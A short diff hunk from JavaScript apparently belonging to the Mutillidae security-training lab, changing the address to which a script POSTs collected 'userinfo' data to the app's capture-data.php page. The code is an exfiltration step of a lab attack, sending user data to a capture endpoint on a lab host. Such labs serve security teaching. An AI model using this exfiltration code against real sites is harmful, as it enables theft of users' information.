@@ -9,7 +9,7 @@
 					}
 				};
 		
-				req.open("post", "http://192.168.56.101:9000/index.php?page=capture-data.php", true);
+				req.open("post", "http://192.168.0.45/mutillidae/index.php?page=capture-data.php", true);
 				req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
 				req.send(userinfo);		
 			}catch(e){ 
